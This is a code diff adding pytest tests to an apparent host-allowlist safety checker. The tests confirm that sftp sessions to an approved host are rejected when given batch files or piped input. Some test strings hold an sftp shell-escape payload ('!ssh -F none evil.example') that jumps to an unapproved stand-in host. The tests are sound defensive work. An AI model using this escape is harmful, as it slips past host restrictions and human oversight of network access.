@@ -1001,3 +1001,24 @@ def test_container_transport_authentication_remains_allowed():
     approve_hosts("review", ["approved.example"])
     code = "import paramiko; clients=[paramiko.Transport(('approved.example',22))]; clients[0].connect(username='review',password='test')"
     assert _check_code_safety(code, session_id = "review") is None
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "printf '%s\\n' '!ssh -F none evil.example' | sftp -F none -b - approved.example",
+        "sftp -F none -b commands.txt approved.example",
+        "sftp -F none -bcommands.txt approved.example",
+        "printf '%s\\n' '!ssh -F none evil.example' | sftp -F none approved.example",
+        "sftp -F none approved.example < commands.txt",
+    ],
+)
+def test_sftp_command_input_fails_closed(command):
+    approve_hosts("review", ["approved.example"])
+    assert check_ssh_command_access(command, "review") is not None
+
+
+def test_python_sftp_input_fails_closed():
+    approve_hosts("review", ["approved.example"])
+    code = "import subprocess; subprocess.run(['sftp','-F','none','approved.example'],input='!ssh -F none evil.example',text=True)"
+    assert _check_code_safety(code, session_id = "review") is not None
